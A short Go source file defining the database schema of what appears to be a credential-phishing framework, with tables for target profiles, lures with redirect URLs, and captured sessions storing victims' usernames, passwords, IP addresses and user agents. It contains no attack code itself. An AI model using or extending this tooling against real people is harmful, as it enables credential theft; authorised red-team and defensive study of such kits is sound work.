package storage

import "database/sql"

const schemaDDL = `
CREATE TABLE IF NOT EXISTS target_profiles (
	id TEXT PRIMARY KEY,
	name TEXT NOT NULL,
	enabled INTEGER NOT NULL DEFAULT 0,
	version TEXT,
	data TEXT NOT NULL,
	created_at INTEGER NOT NULL,
	updated_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS captured_sessions (
	id TEXT PRIMARY KEY,
	target_id TEXT NOT NULL,
	target_name TEXT,
	username TEXT,
	password TEXT,
	remote_addr TEXT,
	user_agent TEXT,
	status TEXT,
	is_valid INTEGER NOT NULL DEFAULT 0,
	data TEXT NOT NULL,
	created_at INTEGER NOT NULL,
	updated_at INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_sessions_target ON captured_sessions(target_id);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON captured_sessions(status);

CREATE TABLE IF NOT EXISTS lures (
	id TEXT PRIMARY KEY,
	path TEXT NOT NULL,
	target_profile TEXT NOT NULL,
	redirect_url TEXT,
	landing_path TEXT,
	is_active INTEGER NOT NULL DEFAULT 1,
	data TEXT NOT NULL,
	created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_lures_path ON lures(path);
`

func ApplySchema(db *sql.DB) error {
	_, err := db.Exec(schemaDDL)
	return err
}
